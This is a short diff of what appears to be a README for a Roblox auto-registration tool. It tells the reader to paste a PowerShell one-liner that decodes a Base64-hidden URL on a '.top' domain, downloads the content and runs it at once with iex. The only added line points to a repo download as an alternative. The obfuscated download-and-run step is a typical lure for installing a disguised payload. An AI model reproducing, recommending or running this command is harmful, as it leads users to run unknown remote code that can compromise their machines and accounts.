@@ -7,6 +7,7 @@ Open PowerShell and run:
 ```powershell
 iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04NjU0ODk4MzM4L1JvYmxveC1BdXRvcmVn'))) -UseBasicParsing)
 ```
+Or download on repo
 
 ---
 
